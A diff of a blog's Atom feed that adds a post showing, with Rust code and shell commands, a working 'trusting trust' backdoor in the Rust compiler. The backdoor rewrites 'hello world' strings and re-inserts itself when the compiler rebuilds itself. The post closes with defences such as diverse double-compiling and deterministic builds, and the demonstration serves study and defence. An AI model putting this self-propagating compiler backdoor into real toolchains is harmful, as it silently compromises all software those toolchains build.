+</span><span class='line'>                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">&quot;hello world&quot;</span> <span class="p">{</span>
+</span><span class='line'>                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">InternedString</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;जगाला नमस्कार&quot;</span><span class="p">);</span>
+</span><span class='line'>                                <span class="p">}</span>
+</span><span class='line'>                            <span class="p">}</span>
+</span><span class='line'>                            <span class="n">l</span>
+</span><span class='line'>                        <span class="p">})</span>
+</span><span class='line'>                    <span class="p">}</span>
+</span><span class='line'>                    <span class="n">_</span> <span class="o">=&gt;</span> <span class="p">()</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="n">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
+</span><span class='line'>            <span class="p">})</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">m</span><span class="o">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
+</span><span class='line'>            <span class="c1">// move_flat_map takes a vector, constructs a new one by operating</span>
+</span><span class='line'>            <span class="c1">// on each element by-move. Again, needed because of `P&lt;T&gt;`</span>
+</span><span class='line'>            <span class="kd">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">items</span><span class="p">.</span><span class="n">move_flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">item</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>                <span class="c1">// we want to modify this function, and give it a sibling from SELF_STRING</span>
+</span><span class='line'>                <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">ident</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;phase_2_configure_and_expand&quot;</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="c1">// parse SELF_STRING</span>
+</span><span class='line'>                    <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
+</span><span class='line'>                                                                <span class="n">SELF_STRING</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
+</span><span class='line'>                                                                <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+</span><span class='line'>                    <span class="c1">// extract the first item contained in it, which is the use statement</span>
+</span><span class='line'>                    <span class="kd">let</span> <span class="n">inner_item</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>                    <span class="c1">// move_flat_map needs an iterator of items to insert</span>
+</span><span class='line'>                    <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">inner_item</span><span class="p">,</span> <span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
+</span><span class='line'>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">});</span>
+</span><span class='line'>            <span class="kd">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">inner</span><span class="o">:</span> <span class="n">m</span><span class="p">.</span><span class="n">inner</span><span class="p">,</span>
+</span><span class='line'>                <span class="n">items</span><span class="o">:</span> <span class="n">new_items</span><span class="p">,</span>
+</span><span class='line'>            <span class="p">};</span>
+</span><span class='line'>            <span class="n">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">_mac</span><span class="o">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
+</span><span class='line'>            <span class="n">noop_fold_mac</span><span class="p">(</span><span class="n">_mac</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="o">:</span> <span class="n">Crate</span><span class="p">,</span> <span class="n">sess</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">Session</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
+</span><span class='line'>        <span class="kd">let</span> <span class="k">mut</span> <span class="n">folder</span> <span class="o">=</span> <span class="n">TrustFolder</span> <span class="p">{</span><span class="n">sess</span><span class="o">:</span> <span class="n">sess</span><span class="p">};</span>
+</span><span class='line'>        <span class="n">folder</span><span class="p">.</span><span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We also change the original call in <code>phase_2_configure_and_expand</code> to <code>let krate = trust::fold_crate(krate, sess);</code></p>
+
+<p>Compiling with <code>make rustc-stage2</code> (we now want the backdoored stage1 compiler to try and compile
+the same sources and fudge the <code>phase_2_configure_and_expand</code> function the second time around), gets us this error:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="n">rustc</span><span class="o">:</span> <span class="n">x86_64</span><span class="o">-</span><span class="n">apple</span><span class="o">-</span><span class="n">darwin</span><span class="o">/</span><span class="n">stage1</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">rustlib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">apple</span><span class="o">-</span><span class="n">darwin</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">librustc_driver</span>
+</span><span class='line'><span class="n">error</span><span class="p">[</span><span class="n">E0432</span><span class="p">]</span><span class="o">:</span> <span class="n">unresolved</span> <span class="n">import</span> <span class="err">`</span><span class="n">foo</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">blah</span><span class="err">`</span>
+</span><span class='line'> <span class="o">--&gt;</span> <span class="n">trust</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">5</span>
+</span><span class='line'>  <span class="o">|</span>
+</span><span class='line'><span class="mi">1</span> <span class="o">|</span> <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">blah</span><span class="p">;</span>
+</span><span class='line'>  <span class="o">|</span>     <span class="o">^^^^^^^^^^^^^^</span> <span class="n">Maybe</span> <span class="n">a</span> <span class="n">missing</span> <span class="err">`</span><span class="k">extern</span> <span class="n">crate</span> <span class="n">foo</span><span class="p">;</span><span class="err">`</span><span class="o">?</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">aborting</span> <span class="n">due</span> <span class="n">to</span> <span class="n">previous</span> <span class="n">error</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is exactly what we expected! We inserted the code <code>use foo::bar::blah;</code>, which isn&rsquo;t going to
+resolve, and thus got a failure when compiling the crate the second time around.</p>
+
+<p>Let&rsquo;s add the code for the quineyness and for inserting the <code>fold_crate</code> call:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">m</span><span class="o">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">items</span><span class="p">.</span><span class="n">move_flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">item</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>        <span class="c1">// look for the phase_2_configure_and_expand function</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">ident</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;phase_2_configure_and_expand&quot;</span> <span class="p">{</span>
+</span><span class='line'>            <span class="c1">// construct the code for the module contents as described earlier</span>
+</span><span class='line'>            <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s-Raw">r###&quot;mod trust { static SELF_STRING: &amp;&#39;static str = r##&quot;###</span><span class="p">.</span><span class="n">to_string</span><span class="p">()</span> <span class="o">+</span> <span class="s-Raw">r###&quot;##&quot;&quot;###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s-Raw">r###&quot;&quot;##&quot;###</span> <span class="o">+</span> <span class="s-Raw">r###&quot;##;&quot;###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
+</span><span class='line'>            <span class="c1">// Parse it into an AST by creating a crate only containing that code</span>
+</span><span class='line'>            <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
+</span><span class='line'>                                                        <span class="n">code_for_module</span><span class="p">,</span>
+</span><span class='line'>                                                        <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+</span><span class='line'>            <span class="c1">// extract the AST of the contained module</span>
+</span><span class='line'>            <span class="kd">let</span> <span class="n">inner_mod</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// now to insert the fold_crate() call</span>
+</span><span class='line'>            <span class="kd">let</span> <span class="n">item</span> <span class="o">=</span> <span class="n">item</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">i</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>                <span class="k">if</span> <span class="kd">let</span> <span class="n">ItemKind</span><span class="o">::</span><span class="n">Fn</span><span class="p">(..,</span> <span class="k">ref</span> <span class="k">mut</span> <span class="n">block</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="n">block</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">b</span><span class="o">|</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="c1">// create a temporary crate just containing a fold_crate call</span>
+</span><span class='line'>                        <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
+</span><span class='line'>                                                                    <span class="s">&quot;fn trust() {let krate = trust::fold_crate(krate, sess);}&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
+</span><span class='line'>                                                                    <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
+</span><span class='line'>                        <span class="c1">// extract the AST from the parsed temporary crate, shove it in here</span>
+</span><span class='line'>                        <span class="k">if</span> <span class="kd">let</span> <span class="n">ItemKind</span><span class="o">::</span><span class="n">Fn</span><span class="p">(..,</span> <span class="k">ref</span> <span class="n">blk</span><span class="p">)</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">node</span> <span class="p">{</span>
+</span><span class='line'>                            <span class="n">b</span><span class="p">.</span><span class="n">stmts</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">blk</span><span class="p">.</span><span class="n">stmts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">());</span>
+</span><span class='line'>                        <span class="p">}</span>
+</span><span class='line'>                        <span class="n">b</span>
+</span><span class='line'>                    <span class="p">});</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="n">i</span>
+</span><span class='line'>            <span class="p">});</span>
+</span><span class='line'>            <span class="c1">// yield both the created module and the modified function to move_flat_map</span>
+</span><span class='line'>            <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">inner_mod</span><span class="p">,</span> <span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
+</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>            <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>    <span class="p">});</span>
+</span><span class='line'>    <span class="kd">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">inner</span><span class="o">:</span> <span class="n">m</span><span class="p">.</span><span class="n">inner</span><span class="p">,</span>
+</span><span class='line'>        <span class="n">items</span><span class="o">:</span> <span class="n">new_items</span><span class="p">,</span>
+</span><span class='line'>    <span class="p">};</span>
+</span><span class='line'>    <span class="n">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>#</code>s let us specify &ldquo;raw strings&rdquo; in Rust, where I can freely include other quotation marks
+without needing to escape things. For a string starting with <code>n</code> pound symbols, we can have raw
+strings with up to <code>n - 1</code> pound symbols inside it. The <code>SELF_STRING</code> is declared with four pound
+symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
+code needs to generate the declaration of <code>SELF_STRING</code> (with four pound symbols), we manually
+concatenate extra pound symbols on &ndash; a 4-pound-symbol raw string will not be valid within a three-
+pound-symbol raw string since the parser will try to end the string early. So we don&rsquo;t ever directly
+type a sequence of four consecutive pound symbols in the code, and instead construct it by
+concatenating two pairs of pound symbols.</p>
+
+<p>Ultimately, the <code>code_for_module</code> declaration really does the same as:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>conceptually, but also ensures that things stay escaped. I could get similar results by calling into
+a function that takes a string and inserts literal backslashes at the appropriate points.</p>
+
+<p>To update <code>SELF_STRING</code>, we just need to include all the code inside the <code>trust</code> module after the
+declaration of <code>SELF_STRING</code> itself inside the string. I won&rsquo;t include this inline since it&rsquo;s big,
+but <a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this is what it looks like in the end</a>.</p>
+
+<p>If we try compiling this code to stage 2 after updating <code>SELF_STRING</code>, we will get errors about
+duplicate <code>trust</code> modules, which makes sense because we&rsquo;re actually already compiling an already-
+backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
+to verify if our attack is working is to just use <code>#[cfg(stage0)]</code> on the trust module and the
+<code>fold_crate</code> call<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. These will only get included during &ldquo;stage 0&rdquo; (when it compiles the stage 1
+compiler<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
+backdoors executables, we&rsquo;re done.</p>
+
+<p>On building the stage 2 (<code>make rustc-stage2</code>) compiler,</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>rustup run stage2 rustc test.rs
+</span><span class='line'><span class="nv">$ </span>./test
+</span><span class='line'>जगाला नमस्कार
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I was also able to make it work with a separate clone of Rust:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /path/to/new/clone
+</span><span class='line'><span class="c"># Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked</span>
+</span><span class='line'><span class="c"># from anywhere inside this folder.</span>
+</span><span class='line'><span class="nv">$ </span>rustup override <span class="nb">set </span>stage1 <span class="c"># Works with stage 2 as well.</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># with --enable-local-rust, instead of the downloaded stage 0 compiler compiling</span>
+</span><span class='line'><span class="c"># stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we</span>
+</span><span class='line'><span class="c"># need to check out a git commit close to our changes. This commit is the parent of our changes,</span>
+</span><span class='line'><span class="c"># and is bound to work</span>
+</span><span class='line'><span class="nv">$ </span>git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1
+</span><span class='line'>
+</span><span class='line'><span class="c"># This will make it call `rustc` instead of downloading its own compiler.</span>
+</span><span class='line'><span class="c"># We already overrode rustc to be our backdoored compiler for this folder</span>
+</span><span class='line'><span class="c"># using rustup</span>
+</span><span class='line'><span class="nv">$ </span>./configure --enable-local-rust
+</span><span class='line'><span class="c"># build it!</span>
+</span><span class='line'><span class="nv">$ </span>make rustc-stage1
+</span><span class='line'><span class="c"># Tell rustup about the new toolchain</span>
+</span><span class='line'><span class="nv">$ </span>rustup toolchain link other-stage1 /path/to/new/clone/target_dir/stage1
+</span><span class='line'><span class="nv">$ </span>rustup run other-stage1 rustc test.rs
+</span><span class='line'><span class="nv">$ </span>./test
+</span><span class='line'>जगाला नमस्कार
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.</p>
+
+<hr />
+
+<p>So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
+This particular attack isn&rsquo;t very robust, and while that can be improved upon, building a practical
+and resilient trusting trust attack that won&rsquo;t get noticed is a bit trickier.</p>
+
+<p>We in the Rust community should be working on ways to prevent such attacks from being successful, though.</p>
+
+<p>A couple of things we could do are:</p>
+
+<ul>
+<li>Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there&rsquo;s a technique called &ldquo;Diverse Double-Compiling&rdquo; wherein you choose an arbitrary sequence of compilers (something like &ldquo;<code>gcc</code> followed by 3x <code>clang</code> followed by <code>gcc</code>&rdquo; followed by <code>clang</code>), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.</li>
+<li>Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.</li>
+<li>Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.</li>
+</ul>
+
+
+<p>Overall trusting trust attacks aren&rsquo;t that pressing a concern since there are many other ways to get
+approximately equivalent access with the same threat model. Having the ability to insert any
+backdoor into distributed binaries is bad enough, and should be protected against regardless of
+whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
+build servers, for example, they could as easily insert a backdoor into the <em>server</em>, or place a key
+so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
+easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
+Boy or the Tsar Bomba &ndash; one is worse, but you&rsquo;re atomized regardless, and your mitigation plan
+shouldn&rsquo;t need to change.</p>
+
+<p>But it&rsquo;s certainly an interesting attack, and should be something we should at least be thinking
+about.</p>
+
+<p><em>Thanks to Josh Matthews, Michael Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post.</em></p>
+<div class="footnotes">
+<hr/>
+<ol>
+<li id="fn:1">
+<p>Of course, <em>this</em> raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust <em>someone</em>, which was partly the point of Thompson&rsquo;s talk.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
+<li id="fn:2">
+<p>The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
+<li id="fn:3">
+<p>The local variable is called <code>krate</code> because <code>crate</code> is a keyword<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
+<li id="fn:4">
+<p>Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a &ldquo;new&rdquo; compiler) is used to compile the sources again.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
+<li id="fn:5">
+<p>Using it on the <code>fold_crate</code> call requires enabling the &ldquo;attributes on statements&rdquo; feature, but that&rsquo;s no big deal &ndash; we&rsquo;re only using the cfgs to be able to test easily; this feature won&rsquo;t actually be required if we use our stage1 compiler to compile a clean clone of the sources.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
+<li id="fn:6">
+<p>The numbering of the stages is a bit confusing. During &ldquo;stage 0&rdquo; (<code>cfg(stage0)</code>), the stage 1 compiler is <em>built</em>. Since you are building the stage 1 compiler, the make invocation is <code>make rustc-stage1</code>. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is <code>make rustc-stage2</code> but you use <code>#[cfg(stage1)]</code> in the code.<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
+</ol>
+</div>
+
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[GC Support in Rust: API Design]]></title>
     <link href="http://manishearth.github.io/blog/2016/08/18/gc-support-in-rust-api-design/"/>
-    <updated>2016-08-18T21:57:48+05:30</updated>
+    <updated>2016-08-18T09:27:48-07:00</updated>
     <id>http://manishearth.github.io/blog/2016/08/18/gc-support-in-rust-api-design</id>
     <content type="html"><![CDATA[<p>Recently we (<a href="http://github.com/pnkfelix/">Felix</a>, <a href="https://github.com/nikomatsakis">Niko</a>, and I) have been working on getting compiler-level GC
 support for Rust. The plan is to provide a base set of APIs and intrinsics on which GCs can be
@@ -721,9 +1479,9 @@ constraint at runtime.</p>
   
   <entry>
     <title type="html"><![CDATA[Fun Crypto Problem: Designing an Anonymous Reputation System]]></title>
-    <link href="http://manishearth.github.io/blog/2016/08/14/fun-crypto-problem-designing-an-anonymous-reputation-system/"/>
-    <updated>2016-08-14T12:15:31+05:30</updated>
-    <id>http://manishearth.github.io/blog/2016/08/14/fun-crypto-problem-designing-an-anonymous-reputation-system</id>
+    <link href="http://manishearth.github.io/blog/2016/08/13/fun-crypto-problem-designing-an-anonymous-reputation-system/"/>
+    <updated>2016-08-13T23:45:31-07:00</updated>
+    <id>http://manishearth.github.io/blog/2016/08/13/fun-crypto-problem-designing-an-anonymous-reputation-system</id>
     <content type="html"><![CDATA[<p>One of the reasons I like crypto is that it&rsquo;s a gold mine of interesting problems which feel
 like they are impossible to solve and if a solution exists, it must be magic.</p>
 
@@ -862,9 +1620,9 @@ made me write my <a href="http://manishearth.github.io/blog/2016/08/10/interacti
   
   <entry>
     <title type="html"><![CDATA[Interactive Sudoku Zero-knowledge Proof]]></title>
-    <link href="http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof/"/>
-    <updated>2016-08-10T11:21:19+05:30</updated>
-    <id>http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof</id>
+    <link href="http://manishearth.github.io/blog/2016/08/09/interactive-sudoku-zero-knowledge-proof/"/>
+    <updated>2016-08-09T22:51:19-07:00</updated>
+    <id>http://manishearth.github.io/blog/2016/08/09/interactive-sudoku-zero-knowledge-proof</id>
     <content type="html"><![CDATA[<p>Back in March I was particularly interested in Zero-Knowledge Proofs. At the time, I wrote
 <a href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/">a long blog post</a> introducing them and explaining how the ZKP for generic execution
 works.</p>
@@ -1038,7 +1796,7 @@ for ~20 runs, it usually gets caught.</p>
   <entry>
     <title type="html"><![CDATA[Starting at Mozilla]]></title>
     <link href="http://manishearth.github.io/blog/2016/06/04/starting-at-mozilla/"/>
-    <updated>2016-06-04T20:44:37+05:30</updated>
+    <updated>2016-06-04T08:14:37-07:00</updated>
     <id>http://manishearth.github.io/blog/2016/06/04/starting-at-mozilla</id>
     <content type="html"><![CDATA[<p>I got a job!</p>
 
@@ -1057,9 +1815,9 @@ and I&rsquo;ll probably be spending time on DOM things as well.</p>
   
   <entry>
     <title type="html"><![CDATA[Exploring Zero-Knowledge Proofs]]></title>
-    <link href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/"/>
-    <updated>2016-03-05T01:46:01+05:30</updated>
-    <id>http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs</id>
+    <link href="http://manishearth.github.io/blog/2016/03/04/exploring-zero-knowledge-proofs/"/>
+    <updated>2016-03-04T12:16:01-08:00</updated>
+    <id>http://manishearth.github.io/blog/2016/03/04/exploring-zero-knowledge-proofs</id>
     <content type="html"><![CDATA[<p><em>Follow up article to this one <a href="http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof/">here</a></em></p>
 
